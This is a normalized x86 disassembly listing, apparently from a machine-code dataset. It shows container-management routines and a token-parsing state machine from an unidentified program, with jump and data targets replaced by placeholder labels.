je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
mov eax [ ebp - 0x1c ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x38 ] esi
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0x4c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx esi
call sub_4a4460
mov ecx 0x4924924
sub ecx edx
cmp ecx ebx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov edx ecx
sub edx edi
mov [ ebp + 0x10 ] edx
mov eax 0x92492493
imul edx
add edx [ ebp + 0x10 ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
cmp edx ebx
mov [ ebp - 0x18 ] ecx
jae r-xdata
mov eax edi
shr eax 0x1
mov ecx 0x4924924
sub ecx eax
cmp ecx edi
jae r-xdata
add edx ebx
cmp edi edx
jae r-xdata
push ecx
imul ebx ebx 0x38
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
sub ecx ebx
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx esi
call sub_4a6660
mov edx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
push ecx
mov ecx [ ebp - 0x18 ]
mov eax esp
mov [ ebp + 0xc ] esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] edi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_402de0
add esp 0x10
lea ecx [ ebp - 0x50 ]
push ecx
push ecx
mov eax esp
add ebx edi
mov [ eax ] ebx
mov eax ebx
imul eax eax 0x38
mov [ ebp + 0x10 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_4a6660
mov ecx [ esi + 0x8 ]
sub ecx edi
lea edx [ ebp - 0x50 ]
push edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x8 ]
sub ebx edx
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_4a66a0
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x50 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add edi eax
xor edi edi
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0x8 ] esp
call sub_4a4560
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
imul edi edi 0x38
push edi
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov [ ebp + 0xc ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x1
mov [ eax ] ecx
call sub_4a45a0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x50 ]
push edx
push ebx
push eax
mov [ ebp + 0xc ] eax
call sub_4a6580
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax ebx
imul eax eax 0x38
add esp 0x14
add ecx eax
mov eax [ esi + 0x8 ]
push edx
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_4a45a0
mov eax [ esi + 0x4 ]
add esp 0x14
test eax eax
jne r-xdata
mov ecx esi
call sub_401120
mov edi eax
add edi ebx
add edx ebx
cmp edi edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
imul ebx ebx 0x38
add edi eax
add ebx eax
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
push ecx
push eax
mov ecx esi
call sub_4a6420
mov edx [ esi + 0x4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
add ebx edx
test eax eax
je r-xdata
sub_4a6a50
push ebp
mov ebp esp
push 0xffffffff
push sub_4c1bd0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
push edi
mov edi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edi + 0x4 ]
mov eax [ esi + 0x8 ]
mov esi [ esi + 0x4 ]
push edx
push edi
push ecx
push eax
push esi
mov [ ebp - 0x4 ] 0x0
call sub_4a45a0
add esp 0x14
mov [ edi + 0x8 ] eax
push edx
mov ecx edi
call sub_4a63c0
test al al
je r-xdata
sub_4a6b00
push ebx
push esi
mov esi ecx
cmp [ esi + 0x44 ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x44 ] 0xf
mov [ esi + 0x40 ] ebx
lea ecx [ esi + 0x1c ]
mov [ esi + 0x30 ] bl
call sub_403b70
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x30 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x4 ] bl
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4a6b50
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
xor esi esi
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx edi
mov [ eax ] ebx
call sub_4a66d0
imul esi esi 0x38
add esi [ edi + 0x4 ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov ecx ebx
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov esi edx
sub_4a6bc0
push 0xffffffff
push sub_4c1bf3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov edi [ esp + 0x20 ]
mov esi ecx
xor ebx ebx
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov [ esp + 0x18 ] esi
mov [ esi + 0x4 ] bl
call sub_401dd0
lea eax [ edi + 0x1c ]
push eax
lea ecx [ esi + 0x1c ]
mov [ esp + 0x1c ] ebx
call sub_4a6a50
push 0xffffffff
lea ecx [ esi + 0x2c ]
push ebx
add edi 0x2c
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push edi
mov [ esp + 0x24 ] 0x1
mov [ ecx + 0x4 ] bl
call sub_401dd0
mov ecx [ esp + 0x10 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4a6c50
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_4a6b50
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_4a6580
add esp 0x14
add edi 0x38
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_4a6ce0
push 0xffffffff
push sub_4c1c11
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov ecx [ esp + 0x14 ]
mov [ esp ] ecx
test ecx ecx
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esp + 0x18 ]
push eax
call sub_4a6bc0
sub_4a6d30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1c28
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3c
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10058 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
mov ecx [ esp + 0x44 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x48
retn
call sub_450380
cmp eax ebx
jne r-xdata
cmp eax 0xd
jne r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
jmp r-xdata
cmp eax 0x30
je r-xdata
mov ecx esi
call sub_450380
cmp eax 0x32
jne r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
push ebp
push edi
mov ecx esi
call sub_450380
cmp eax 0x16
mov [ esp + 0x13 ] bl
jne r-xdata
cmp [ esi + 0x10038 ] ebx
jne r-xdata
cmp eax 0xd
jne r-xdata
mov ecx esi
mov [ esp + 0x13 ] 0x1
call sub_450380
mov [ esi + 0x10058 ] 0xffffffff
pop esi
pop ebx
mov ecx [ esp + 0x3c ]
mov [ fs : 0x0 ] ecx
add esp 0x48
retn
push r--data
push esi
call sub_4a4220
add esp 0x8
cmp eax 0x12
jne r-xdata
cmp [ esi + 0x10038 ] ebx
jne r-xdata
mov ecx esi
call sub_44fb10
mov ecx eax
lea edi [ ecx + 0x1 ]
jmp r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
cmp eax 0x2
je r-xdata
mov ecx esi
call sub_450380
cmp eax 0x3b
je r-xdata
mov ecx esi
call sub_450380
cmp eax 0x2
je r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
mov ecx esi
call sub_450380
cmp eax 0x3b
jne r-xdata
push r--data
mov ecx esi
lea edi [ esi + 0x10028 ]
call sub_44fb10
push eax
mov ecx edi
call sub_4a3c60
push eax
call sub_428d60
add esp 0x8
test al al
je r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
sub ecx edi
push ecx
push eax
lea ecx [ esi + 0x1005c ]
call sub_401e80
lea ecx [ esi + 0x10088 ]
call sub_401f20
lea ebp [ esi + 0x10078 ]
mov ecx ebp
call sub_403b70
mov edi edi
cmp eax ebx
je r-xdata
mov ecx esi
call sub_450380
cmp eax 0x32
jne r-xdata
mov ecx esi
call sub_450380
cmp eax 0x32
je r-xdata
mov ecx edi
call sub_4a3c60
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea ecx [ esp + 0x14 ]
mov [ esi + 0x10058 ] 0x1
call sub_401ae0
pop edi
pop ebp
pop esi
pop ebx
mov ecx [ esp + 0x3c ]
mov [ fs : 0x0 ] ecx
add esp 0x48
retn
mov ecx esi
call sub_450380
mov edi eax
cmp edi ebx
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov ecx esi
pop edi
pop ebp
mov [ esi + 0x10058 ] 0xffffffff
pop esi
pop ebx
mov ecx [ esp + 0x3c ]
mov [ fs : 0x0 ] ecx
add esp 0x48
retn
push r--data
push esi
call sub_4a4220
add esp 0x8
lea edi [ eax + 0x4 ]
mov edi [ eax + 0x4 ]
jmp r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
cmp edi 0x1
jne r-xdata
push esi
call sub_4a4220
add esp 0x8
mov ecx esi
call sub_44fb10
push eax
push edi
push r--data
push esi
call sub_4a4220
add esp 0x10
cmp edi 0x32
je r-xdata
cmp [ esp + 0x13 ] bl
je r-xdata
cmp edi 0x16
jne r-xdata
lea ecx [ esp + 0x14 ]
mov [ esp + 0x54 ] 0xffffffff
call sub_401ae0
cmp [ esp + 0x13 ] bl
mov ecx esi
jne r-xdata
cmp edi 0x2
je r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
mov ecx esi
call sub_450380
mov edi eax
call sub_4a6d30
pop edi
pop ebp
pop esi
pop ebx
mov ecx [ esp + 0x3c ]
mov [ fs : 0x0 ] ecx
add esp 0x48
retn
call sub_4a42d0
pop edi
mov [ esi + 0x10058 ] 0x1
pop ebp
mov ecx esi
call sub_44fb10
mov ecx eax
lea edi [ ecx + 0x1 ]
lea ecx [ ecx ]
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
sub ecx edi
push ecx
push eax
lea ecx [ esp + 0x1c ]
call sub_401e80
mov ecx esi
call sub_450380
cmp eax 0x3c
je r-xdata
mov ecx esi
call sub_450380
cmp eax 0x1d
je r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
mov ecx esi
call sub_44fb10
mov ecx eax
lea edi [ ecx + 0x1 ]
lea esp [ esp ]
cmp eax 0x1e
je r-xdata
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
sub ecx edi
push ecx
push eax
lea ecx [ esp + 0x38 ]
call sub_401e80
lea eax [ esp + 0x14 ]
push eax
mov ecx ebp
call sub_4a6c50
mov eax [ esp + 0x48 ]
mov edi 0x10
cmp eax edi
jb r-xdata
push r--data
push esi
call sub_4a4220
add esp 0x8
cmp [ esp + 0x2c ] edi
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
jb r-xdata
mov ecx [ esp + 0x34 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax 0xf
mov [ esp + 0x2c ] eax
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] bl
mov [ esp + 0x48 ] eax
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov ecx esi
mov [ esp + 0x54 ] ebx
call sub_450270
cmp eax 0xd
je r-xdata
mov edx [ esp + 0x18 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
sub_4a7120
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0x8 ]
inc eax
cmp ecx eax
push edi
ja r-xdata
mov edi [ esi + 0xc ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
add edi edx
cmp eax edi
ja r-xdata
push 0x1
mov ecx esi
call sub_4a6450
mov ecx [ esi + 0x4 ]
cmp [ ecx + edi * 4 ] 0x0
jne r-xdata
sub edi eax
mov eax [ esp + 0xc ]
mov ecx [ esi + 0x4 ]
mov edx [ ecx + edi * 4 ]
push eax
push edx
call sub_4a6ce0
mov eax [ esi + 0x10 ]
add esp 0x8
inc eax
pop edi
mov [ esi + 0x10 ] eax
pop esi
retn 0x4
push 0x48
call sub_4b573e
mov edx [ esi + 0x4 ]
add esp 0x4
mov [ edx + edi * 4 ] eax
sub_4a7190
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
xor ebx ebx
cmp eax ebx
push edi
je r-xdata
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
mov edi edi
mov edx [ esi + 0x4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov ecx [ eax + edi * 4 - 0x4 ]
dec edi
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp edi ebx
ja r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
mov ecx [ esi + 0xc ]
lea eax [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x8 ]
cmp ecx eax
ja r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ edx + eax * 4 ]
call sub_4a6b00
dec [ esi + 0x10 ]
jne r-xdata
sub eax ecx
mov [ esi + 0xc ] ebx
sub_4a7210
push esi
push edi
mov esi ecx
call sub_4a6d30
mov eax [ esi + 0x10058 ]
xor edi edi
cmp eax edi
jle r-xdata
mov eax [ esi + 0x10038 ]
cmp eax edi
je r-xdata
lea eax [ esi + 0x1005c ]
push eax
lea ecx [ esi + 0x10028 ]
call sub_4a7120
mov [ esi + 0x10058 ] edi
pop edi
pop esi
retn
mov [ esi + 0x10058 ] edi
pop edi
pop esi
retn
mov ecx [ esi + 0x10034 ]
lea eax [ ecx + eax - 0x1 ]
mov ecx [ esi + 0x10030 ]
cmp ecx eax
ja r-xdata
mov edx [ esi + 0x1002c ]
mov ecx [ edx + eax * 4 ]
call sub_4a6b00
dec [ esi + 0x10038 ]
jne r-xdata
sub eax ecx
mov [ esi + 0x10034 ] edi
sub_4a72a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1c75
push eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
call sub_44fb50
xor eax eax
mov [ esi + 0x1002c ] eax
mov [ esi + 0x10030 ] eax
mov [ esi + 0x10034 ] eax
mov [ esi + 0x10038 ] eax
mov ecx 0xf
mov [ esi + 0x10054 ] ecx
mov [ esi + 0x10050 ] eax
mov [ esi + 0x10040 ] al
mov [ esi + 0x10074 ] ecx
mov [ esi + 0x10070 ] eax
mov [ esi + 0x10060 ] al
mov [ esi + 0x1007c ] eax
mov [ esi + 0x10080 ] eax
mov [ esi + 0x10084 ] eax
mov [ esi + 0x100a0 ] ecx
mov ecx [ esp + 0x4 ]
mov [ esi + 0x1009c ] eax
mov [ esi + 0x1008c ] al
mov [ esi + 0x10058 ] eax
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn
sub_4a7340
push esi
mov esi ecx
lea ecx [ esi + 0x1005c ]
call sub_4a6b00
cmp [ esi + 0x10054 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x10054 ] 0xf
mov [ esi + 0x10050 ] eax
lea ecx [ esi + 0x10028 ]
mov [ esi + 0x10040 ] al
call sub_4a7190
mov ecx esi
pop esi
jmp sub_44f5f0
mov eax [ esi + 0x10040 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4a73a0
sub esp 0x8
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10038 ]
test edi edi
jbe r-xdata
mov ecx esi
call sub_4a7210
cmp edi [ esi + 0x10038 ]
jge r-xdata
mov edx [ esi + 0x10034 ]
mov eax [ esi + 0x10038 ]
lea ecx [ esi + 0x10028 ]
add eax edx
mov edx [ ecx + 0x8 ]
mov [ esp + 0x8 ] eax
dec eax
cmp edx eax
ja r-xdata
pop edi
xor al al
pop esi
add esp 0x8
retn 0x4
mov eax [ esi + 0x10038 ]
mov edi [ esi + 0x10034 ]
mov edx [ esi + 0x10030 ]
lea ecx [ esi + 0x10028 ]
add eax edi
mov [ esp + 0x8 ] eax
dec eax
cmp edx eax
ja r-xdata
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax * 4 ]
mov eax [ edx + 0x40 ]
test eax eax
jne r-xdata
sub eax edx
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax * 4 ]
mov ecx [ esp + 0x14 ]
push 0xffffffff
push 0x0
push edx
call sub_401dd0
pop edi
mov al 0x1
pop esi
add esp 0x8
retn 0x4
sub eax edx
sub_4a7440
sub esp 0x8
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10038 ]
lea ecx [ ecx ]
mov ecx esi
call sub_4a7210
cmp edi [ esi + 0x10038 ]
jle r-xdata
mov ecx esi
call sub_4a6d30
mov eax [ esi + 0x10058 ]
test eax eax
jle r-xdata
pop edi
xor al al
pop esi
add esp 0x8
retn 0x4
mov ecx esi
call sub_4a7210
mov eax [ esi + 0x10038 ]
mov edi [ esi + 0x10034 ]
mov edx [ esi + 0x10030 ]
lea ecx [ esi + 0x10028 ]
add eax edi
mov [ esp + 0x8 ] eax
dec eax
cmp edx eax
ja r-xdata
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax * 4 ]
mov ecx [ esp + 0x14 ]
push 0xffffffff
push 0x0
push edx
call sub_401dd0
pop edi
mov al 0x1
pop esi
add esp 0x8
retn 0x4
sub eax edx
sub_4a74d0
push 0xffffffff
push sub_4c1d03
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x174
push ebx
push esi
push edi
mov edi 0xf
xor esi esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x20 ] esi
mov [ esp + 0x10 ] 0x0
mov eax r--data
mov [ esp + 0x188 ] esi
mov [ esp + 0x64 ] edi
mov [ esp + 0x60 ] esi
mov [ esp + 0x50 ] 0x0
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x54 ]
call sub_401e80
mov eax r--data
mov [ esp + 0x188 ] 0x1
mov [ esp + 0x80 ] edi
mov [ esp + 0x7c ] esi
mov [ esp + 0x6c ] 0x0
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x70 ]
call sub_401e80
mov eax r--data
mov [ esp + 0x188 ] 0x2
mov [ esp + 0x9c ] edi
mov [ esp + 0x98 ] esi
mov [ esp + 0x88 ] 0x0
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x8c ]
call sub_401e80
mov eax r--data
mov [ esp + 0x188 ] 0x3
mov [ esp + 0xb8 ] edi
mov [ esp + 0xb4 ] esi
mov [ esp + 0xa4 ] 0x0
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0xa8 ]
call sub_401e80
mov [ esp + 0x40 ] edi
mov [ esp + 0x3c ] esi
mov [ esp + 0x2c ] 0x0
mov ebx [ esp + 0x190 ]
lea eax [ esp + 0xc ]
push eax
mov ecx ebx
mov [ esp + 0x18c ] 0x5
call sub_4a73a0
test al al
je r-xdata
mov eax [ esp + 0x3c ]
xor edi edi
cmp eax edi
je r-xdata
push ebp
push r--data
lea edx [ esp + 0x50 ]
push edx
lea eax [ esp + 0x16c ]
push eax
call sub_402140
lea ecx [ esp + 0x74 ]
push ecx
push eax
lea edx [ esp + 0x140 ]
push edx
mov [ esp + 0x1a0 ] 0x6
call sub_420e80
push r--data
push eax
lea eax [ esp + 0x114 ]
push eax
mov [ esp + 0x1ac ] 0x7
call sub_402140
lea ecx [ esp + 0xa8 ]
push ecx
push eax
lea edx [ esp + 0x104 ]
push edx
mov [ esp + 0x1b8 ] 0x8
call sub_420e80
push r--data
push eax
lea eax [ esp + 0x148 ]
push eax
mov [ esp + 0x1c4 ] 0x9
call sub_402140
lea ecx [ esp + 0xdc ]
push ecx
push eax
lea edx [ esp + 0x100 ]
push edx
mov [ esp + 0x1d0 ] 0xa
call sub_420e80
add esp 0x48
lea ecx [ esp + 0x28 ]
push ecx
push eax
lea edx [ esp + 0x150 ]
push edx
mov [ esp + 0x194 ] 0xb
call sub_420e80
add esp 0xc
mov ecx [ esp + 0x194 ]
push 0xffffffff
push edi
push eax
mov [ esp + 0x194 ] 0xc
call sub_4018c0
mov eax [ esp + 0x160 ]
mov esi 0x10
cmp eax esi
jb r-xdata
push 0x3e
push 0x1
lea ecx [ esp + 0x30 ]
call sub_4017f0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
cmp [ esp + 0xd4 ] esi
mov ebx 0xf
mov [ esp + 0x160 ] ebx
mov [ esp + 0x15c ] edi
mov [ esp + 0x14c ] 0x0
jb r-xdata
mov eax [ esp + 0x14c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ebp [ esp + 0x24 ]
sub eax edx
test ebp ebp
je r-xdata
cmp [ esp + 0x128 ] esi
mov [ esp + 0xd4 ] ebx
mov [ esp + 0xd0 ] edi
mov [ esp + 0xc0 ] 0x0
jb r-xdata
mov ecx [ esp + 0xc0 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp ebp eax
jb r-xdata
cmp ebp eax
mov ecx ebp
jb r-xdata
cmp [ esp + 0xf0 ] esi
mov [ esp + 0x128 ] ebx
mov [ esp + 0x124 ] edi
mov [ esp + 0x114 ] 0x0
jb r-xdata
mov edx [ esp + 0x114 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax r--data
lea edx [ eax + 0x1 ]
xor edx edx
cmp ebp eax
setne dl
test edx edx
jne r-xdata
cmp [ esp + 0x28 ] 0x10
mov esi [ esp + 0x14 ]
jae r-xdata
mov ecx eax
cmp [ esp + 0x10c ] esi
mov [ esp + 0xf0 ] ebx
mov [ esp + 0xec ] edi
mov [ esp + 0xdc ] 0x0
jb r-xdata
mov eax [ esp + 0xdc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
push ebp
push 0x0
lea ecx [ esp + 0x20 ]
call sub_401150
test eax eax
jne r-xdata
mov eax [ ebx + 0x10038 ]
test eax eax
jne r-xdata
mov edi r--data
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ esp + 0x14 ]
cmp [ esp + 0x144 ] esi
mov [ esp + 0x10c ] ebx
mov [ esp + 0x108 ] edi
mov [ esp + 0xf8 ] 0x0
jb r-xdata
mov ecx [ esp + 0xf8 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ ebx + 0x10038 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x10038 ]
mov edi [ ebx + 0x10034 ]
mov edx [ ebx + 0x10030 ]
lea ecx [ ebx + 0x10028 ]
add eax edi
mov [ esp + 0x48 ] eax
dec eax
cmp edx eax
ja r-xdata
push r--data
push ebx
call sub_4a4220
add esp 0x8
test edx edx
mov ebx [ esp + 0x194 ]
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
cmp [ esp + 0x17c ] esi
mov [ esp + 0x144 ] ebx
mov [ esp + 0x140 ] edi
mov [ esp + 0x130 ] 0x0
jb r-xdata
mov edx [ esp + 0x130 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax [ esp + 0x28 ]
push r--data
push eax
push 0x0
lea ecx [ esp + 0x20 ]
call sub_401150
test eax eax
jne r-xdata
mov eax [ ebx + 0x10038 ]
mov edi [ ebx + 0x10034 ]
mov edx [ ebx + 0x10030 ]
lea ecx [ ebx + 0x10028 ]
add eax edi
mov [ esp + 0x48 ] eax
dec eax
cmp edx eax
ja r-xdata
push r--data
push ebx
call sub_4a4220
add esp 0x8
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
push 0xffffffff
add eax 0x2c
push 0x0
push eax
lea ecx [ esp + 0xb0 ]
call sub_401dd0
jmp r-xdata
sub eax edx
